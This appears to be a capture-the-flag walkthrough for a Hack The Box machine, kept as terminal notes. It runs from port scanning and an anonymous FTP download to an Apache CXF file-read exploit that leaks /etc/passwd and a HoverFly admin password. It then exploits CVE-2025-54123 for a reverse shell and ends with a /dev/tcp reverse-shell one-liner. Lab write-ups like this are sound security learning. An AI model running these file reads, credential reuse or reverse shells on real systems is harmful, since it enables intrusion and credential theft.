└─$ nmap  -sSCV 10.129.244.208  --min-rate 999    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-02 13:38 +1100
Nmap scan report for 10.129.244.208
Host is up (0.13s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.120
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)
|_  256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://devarea.htb/
8080/tcp open  http    Jetty 9.4.27.v20200227
|_http-server-header: Jetty(9.4.27.v20200227)
|_http-title: Error 404 Not Found
8500/tcp open  http    Golang net/http server
8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)


For port 21/

└─$ ftp 10.129.244.208
Connected to 10.129.244.208.
220 (vsFTPd 3.0.5)
Name (10.129.244.208:
229 Entering Extended Passive Mode (|||40912|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||46130|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
226 Directory send OK.
ftp> mget employee-service.jar
mget employee-service.jar [anpqy?]? y
229 Entering Extended Passive Mode (|||47293|)
150 Opening BINARY mode data connection for employee-service.jar (6445030 bytes).
100% |***************************************************************************|  6293 KiB  673.14 KiB/s    00:00 ETA
226 Transfer complete.
6445030 bytes received in 00:09 (657.95 KiB/s)
ftp> bye

use jd-gui to view the jar file.
htb.devarea.ServerStarter

package htb.devarea;

import org.apache.cxf.jaxws.JaxWsServerFactoryBean;

public class ServerStarter {
  public static void main(String[] args) {
    JaxWsServerFactoryBean factory = new JaxWsServerFactoryBean();
    factory.setServiceClass(EmployeeService.class);
    factory.setServiceBean(new EmployeeServiceImpl());
    factory.setAddress("http://0.0.0.0:8080/employeeservice");
    factory.create();
    System.out.println("Employee Service running at http://localhost:8080/employeeservice");
    System.out.println("WSDL available at http://localhost:8080/employeeservice?wsdl");
  }
}

Apache CXF is used for Building Web Services

─$ sudo bash cfx_lfi.sh file:///etc/passwd               
[!] Exploit failed or no readable content
[*] Dumping raw response:
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjQyOjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kbm9ib2R5Ong6NjU1MzQ6NjU1MzQ6bm9ib2R5Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLW5ldHdvcms6eDo5OTg6OTk4OnN5c3RlbWQgTmV0d29yayBNYW5hZ2VtZW50Oi86L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC10aW1lc3luYzp4Ojk5Nzo5OTc6c3lzdGVtZCBUaW1lIFN5bmNocm9uaXphdGlvbjovOi91c3Ivc2Jpbi9ub2xvZ2luCm1lc3NhZ2VidXM6eDoxMDE6MTAyOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1yZXNvbHZlOng6OTkyOjk5MjpzeXN0ZW1kIFJlc29sdmVyOi86L3Vzci9zYmluL25vbG9naW4KcG9sbGluYXRlOng6MTAyOjE6Oi92YXIvY2FjaGUvcG9sbGluYXRlOi9iaW4vZmFsc2UKcG9sa2l0ZDp4Ojk5MTo5OTE6VXNlciBmb3IgcG9sa2l0ZDovOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c2xvZzp4OjEwMzoxMDQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgp1dWlkZDp4OjEwNDoxMDU6Oi9ydW4vdXVpZGQ6L3Vzci9zYmluL25vbG9naW4KdGNwZHVtcDp4OjEwNToxMDc6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgp0c3M6eDoxMDY6MTA4OlRQTSBzb2Z0d2FyZSBzdGFjaywsLDovdmFyL2xpYi90cG06L2Jpbi9mYWxzZQpsYW5kc2NhcGU6eDoxMDc6MTA5OjovdmFyL2xpYi9sYW5kc2NhcGU6L3Vzci9zYmluL25vbG9naW4KZnd1cGQtcmVmcmVzaDp4Ojk4OTo5ODk6RmlybXdhcmUgdXBkYXRlIGRhZW1vbjovdmFyL2xpYi9md3VwZDovdXNyL3NiaW4vbm9sb2dpbgp1c2JtdXg6eDoxMDg6NDY6dXNibXV4IGRhZW1vbiwsLDovdmFyL2xpYi91c2JtdXg6L3Vzci9zYmluL25vbG9naW4Kc3NoZDp4OjEwOTo2NTUzNDo6L3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCmRldl9yeWFuOng6MTAwMToxMDAxOjovaG9tZS9kZXZfcnlhbjovYmluL2Jhc2gKZnRwOng6MTEwOjExMTpmdHAgZGFlbW9uLCwsOi9zcnYvZnRwOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3dhdGNoOng6OTg0Ojk4NDo6L29wdC9zeXN3YXRjaDovdXNyL3NiaW4vbm9sb2dpbgpwb3N0Zml4Ong6MTExOjExMjo6L3Zhci9zcG9vbC9wb3N0Zml4Oi91c3Ivc2Jpbi9ub2xvZ2luCl9sYXVyZWw6eDo5OTk6OTg3OjovdmFyL2xvZy9sYXVyZWw6L2Jpbi9mYWxzZQpkaGNwY2Q6eDoxMDA6NjU1MzQ6REhDUCBDbGllbnQgRGFlbW9uLCwsOi91c3IvbGliL2RoY3BjZDovYmluL2ZhbHNlCg==. Department: IT. Content: test</return></ns2:submitReportResponse></soap:Body></soap:Envelope>


└─$ echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmF...luL2ZhbHNlCg==" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
..
dev_ryan:x:1001:1001::/home/dev_ryan:/bin/bash
ftp:x:110:111:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
syswatch:x:984:984::/opt/syswatch:/usr/sbin/nologin
postfix:x:111:112::/var/spool/postfix:/usr/sbin/nologin
_laurel:x:999:987::/var/log/laurel:/bin/false
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
                                                                    
└─$ sudo bash cfx_lfi.sh file:///home/dev_ryan/.ssh/id_rsa
[!] Exploit failed or no readable content
[*] Dumping raw response:
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from . Department: IT. Content: test</return></ns2:submitReportResponse></soap:Body></soap:Envelope>


└─$ sudo bash cfx_lfi.sh file:///etc/systemd/system/hoverfly.service
[!] Exploit failed or no readable content
[*] Dumping raw response:
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns2:submitReportResponse xmlns:ns2="http://devarea.htb/"><return>Report received from W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==. Department: IT. Content: test</return></ns2:submitReportResponse></soap:Body></soap:Envelope>
                                                                                                              
┌──(ed㉿kali)-[~/Downloads]
└─$ echo "W1VuaXRdCkRlc2NyaXB0aW9uPUhvdmVyRmx5IHNlcnZpY2UKQWZ0ZXI9bmV0d29yay50YXJnZXQKCltTZXJ2aWNlXQpVc2VyPWRldl9yeWFuCkdyb3VwPWRldl9yeWFuCldvcmtpbmdEaXJlY3Rvcnk9L29wdC9Ib3ZlckZseQpFeGVjU3RhcnQ9L29wdC9Ib3ZlckZseS9ob3ZlcmZseSAtYWRkIC11c2VybmFtZSBhZG1pbiAtcGFzc3dvcmQgTzdJSjI3TXl5WGlVIC1saXN0ZW4tb24taG9zdCAwLjAuMC4wCgpSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFNlYz01ClN0YXJ0TGltaXRJbnRlcnZhbFNlYz02MApTdGFydExpbWl0QnVyc3Q9NQpMaW1pdE5PRklMRT02NTUzNgpTdGFuZGFyZE91dHB1dD1qb3VybmFsClN0YW5kYXJkRXJyb3I9am91cm5hbAoKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==" | base64 -d
[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target

use this credential to login port 8888, which is runing hoverfly service.
Version	v1.11.3


https://github.com/0xzap/CVE-2025-54123/blob/main/cve-2025-54123.py

└─$ python3 cve-2025-54123.py devarea.htb 8888 10.10.16.120 8821  eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODYxNDgzOTQsImlhdCI6MTc3NTEwODM5NCwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.gPJFzJATA23SWBBM08i_U1nvFwUyp17oiDMajwcr_nODLRLDL9jwiulKYHunrFlh1l5unh2pBCv0tQSHEUweiA
[*] Target: http://devarea.htb:8888/api/v2/hoverfly/middleware
[*] Listener: nc -lvnp 8821

└─$ nc -nvlp 8821
listening on [any] 8821 ...
connect to [10.10.16.120] from (UNKNOWN) [10.129.244.208] 57794
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
$ python3 -c "import pty;pty.spawn('/bin/bash')"

/bin/sh -i >& /dev/tcp/10.10.16.120/8822 0>&1
